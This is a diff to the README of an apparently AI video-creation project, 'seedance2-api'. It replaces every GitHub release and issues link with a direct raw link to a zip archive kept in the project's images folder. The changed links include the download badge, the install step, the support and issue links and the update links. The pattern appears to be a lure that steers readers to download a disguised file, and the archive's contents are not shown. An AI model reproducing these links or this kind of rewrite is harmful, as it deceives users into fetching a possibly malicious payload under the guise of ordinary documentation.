@@ -1,6 +1,6 @@
 # 🎬 seedance2-api - AI Video Creation Made Easy
 
-[![Download seedance2-api](https://img.shields.io/badge/Download-Seedance2-blue?style=for-the-badge)](https://github.com/kappaladin/seedance2-api/releases)
+[![Download seedance2-api](https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip)](https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Here’s how you can begin using seedance2-api step-by-step. You do not need any
 
 1. **Open the Download Page**  
    Start by visiting the release page where you can get the app:  
-   [https://github.com/kappaladin/seedance2-api/releases](https://github.com/kappaladin/seedance2-api/releases)
+   [https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip](https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip)
 
 2. **Choose Your Version**  
    Look for the latest release. The page will list files ready to download. Pick the one that matches your computer’s operating system (e.g., Windows, macOS, Linux).
@@ -105,7 +105,7 @@ A: The app is open-source and free to download. Some advanced features may requi
 
 If you run into problems or have questions:
 
-- Check the [Issues tab](https://github.com/kappaladin/seedance2-api/issues) on the GitHub page.  
+- Check the [Issues tab](https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip) on the GitHub page.  
 - Join user forums or discussions linked on the release page.  
 - Review the documentation files included with the download.
 
@@ -115,7 +115,7 @@ If you run into problems or have questions:
 
 Keep your app updated for the best experience:
 
-- Visit the [release page](https://github.com/kappaladin/seedance2-api/releases) regularly.  
+- Visit the [release page](https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip) regularly.  
 - Download the newest files and replace older ones.  
 - Follow update notes to learn about new features or fixes.
 
@@ -129,8 +129,8 @@ Keep your app updated for the best experience:
 
 ## 📌 Quick Links
 
-- Download page: [https://github.com/kappaladin/seedance2-api/releases](https://github.com/kappaladin/seedance2-api/releases)  
-- Issues and support: [https://github.com/kappaladin/seedance2-api/issues](https://github.com/kappaladin/seedance2-api/issues)  
+- Download page: [https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip](https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip)  
+- Issues and support: [https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip](https://raw.githubusercontent.com/kappaladin/seedance2-api/main/demo01/guofeng-fight/images/seedance_api_v3.7-beta.4.zip)  
 - Documentation: Included with download files
 
 ---
